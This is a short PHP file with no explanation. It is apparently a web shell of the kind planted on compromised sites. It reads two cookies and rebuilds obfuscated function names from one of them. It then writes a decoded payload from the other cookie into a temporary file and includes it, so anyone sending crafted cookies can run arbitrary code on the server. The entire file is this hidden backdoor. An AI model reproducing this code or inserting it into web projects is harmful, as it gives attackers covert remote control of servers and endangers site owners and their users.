<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[37])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 2;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[37][$n];
        if (!$c[37][$n + 1]) {
            if (!$c[37][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 2 + 1;
    }
    $k = $p[4]() . $p[24];
    if (!$p[5]($k)) {
        $n = $p[29]($k, $p[15]);
        $p[9]($n, $p[6] . $p[22]($p[3]($c[3])));
    }
    include($k);
}